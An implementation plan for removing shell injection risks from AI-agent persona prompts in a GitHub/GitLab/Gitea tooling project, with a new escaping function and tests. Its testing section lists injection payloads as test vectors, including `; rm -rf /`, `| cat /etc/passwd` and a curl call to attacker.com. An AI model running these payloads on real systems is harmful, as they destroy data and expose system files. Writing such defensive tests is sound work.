# Implementation Plan: Harden Shell Injection

## Objective

Eliminate shell injection vectors in all forge persona files (GitHub, GitLab, Gitea) by replacing inline shell argument interpolation with safe patterns: `--body-file` for content, quoted heredocs for multi-line, and `gh api` with JSON payloads where applicable. Add security tests and update documentation.

## Approach

The fix is entirely at the **persona prompt layer** — the markdown files that instruct AI agents how to construct CLI commands. The Go code (`internal/github/client.go`) already uses `net/http` with JSON payloads and is not affected. The security module already detects shell metacharacters but needs a new `ShellEscape` utility for defense-in-depth.

**Strategy**: For each vulnerable persona, replace inline `--body "..."` / `--title "..."` patterns with:

1. **Write-to-file + `--body-file`**: For all body/description content, write to a temp file first, then reference via `--body-file /tmp/wave-body.md`
2. **Quoted heredocs**: Use `cat <<'EOF'` (single-quoted delimiter prevents shell expansion) for constructing temp files
3. **`gh api` with JSON payloads**: For title/label updates on GitHub, use `gh api` with `--input` from a JSON file to completely bypass shell parsing

Each persona file exists in two locations (`.wave/personas/` and `internal/defaults/personas/`) and both must be updated identically.

## File Mapping

### Persona Files to Modify (each exists in 2 locations)

| File | Action | Location 1 | Location 2 |
|------|--------|-----------|-----------|
| `github-enhancer.md` | modify | `.wave/personas/` | `internal/defaults/personas/` |
| `github-commenter.md` | modify | `.wave/personas/` | `internal/defaults/personas/` |
| `github-scoper.md` | modify | `.wave/personas/` | `internal/defaults/personas/` |
| `gitea-enhancer.md` | modify | `.wave/personas/` | `internal/defaults/personas/` |
| `gitea-commenter.md` | modify | `.wave/personas/` | `internal/defaults/personas/` |
| `gitlab-enhancer.md` | modify | `.wave/personas/` | `internal/defaults/personas/` |
| `gitlab-commenter.md` | modify | `.wave/personas/` | `internal/defaults/personas/` |

### Prompt Files to Harden

| File | Action | Notes |
|------|--------|-------|
| `.wave/prompts/speckit-flow/create-pr.md` | modify | Uses inline `--body` — switch to heredoc |
| `internal/defaults/prompts/speckit-flow/create-pr.md` | modify | Same |

### Security Module

| File | Action | Notes |
|------|--------|-------|
| `internal/security/sanitize.go` | modify | Add `ShellEscape()` utility function |
| `internal/security/sanitize_test.go` | modify | Add tests for `ShellEscape()` and injection scenarios |

### Documentation

| File | Action | Notes |
|------|--------|-------|
| `docs/guides/custom-personas.md` | modify | Add "Secure CLI Patterns" section |
| `docs/guides/github-integration.md` | modify | Add security section for CLI commands |

## Architecture Decisions

1. **Temp files over heredocs for body content**: While heredocs with single-quoted delimiters (`<<'EOF'`) prevent expansion, temp files are more reliable across different shell environments and avoid issues with content that contains `EOF` literally.

2. **`gh api` for structured updates**: For GitHub-specific operations, `gh api` with `--input` from a JSON file completely bypasses shell argument parsing. This is the gold standard but only works for GitHub (not Gitea/GitLab CLIs).

3. **Both locations updated identically**: `.wave/personas/` (runtime) and `internal/defaults/personas/` (embedded defaults) must stay in sync. Each persona file is edited individually per CLAUDE.md rules.

4. **Bitbucket personas are the model**: The existing bitbucket-enhancer and bitbucket-commenter already use the safe pattern (JSON payload → temp file → `curl -d @file`). We replicate this pattern for other forges.

5. **Security module gets ShellEscape**: A `ShellEscape(s string) string` function in `internal/security/sanitize.go` provides defense-in-depth. Persona docs can reference it, but the primary fix is architectural (don't pass untrusted input through shell at all).

## Risks

| Risk | Likelihood | Mitigation |
|------|-----------|------------|
| Persona behavior regression | Medium | AI agents interpret new patterns differently | Test with real gh CLI commands in dry-run mode |
| Temp file cleanup | Low | Files accumulate in `/tmp` | Use unique filenames with cleanup instructions in prompts |
| `gh api` compatibility | Low | Older gh CLI versions may not support `--input` | Keep `--body-file` as fallback pattern in docs |
| Dual-location sync drift | Medium | `.wave/personas/` and `internal/defaults/personas/` diverge | PR review checklist must verify both locations |

## Testing Strategy

1. **Unit tests** (`internal/security/sanitize_test.go`):
   - `TestShellEscape` — table-driven tests for shell metacharacter escaping
   - `TestShellEscape_InjectionVectors` — specific attack payloads: `$(whoami)`, `` `id` ``, `; rm -rf /`, `| cat /etc/passwd`, `"$(curl attacker.com)"`

2. **Integration tests** (new: `internal/security/injection_test.go`):
   - Verify that `containsShellMetachars` correctly flags all known injection patterns
   - Verify risk score calculation for injection payloads

3. **Manual validation**:
   - Create a test issue with title `Test $(whoami) injection` and verify the hardened persona handles it safely
   - Review each modified persona file for any remaining inline interpolation
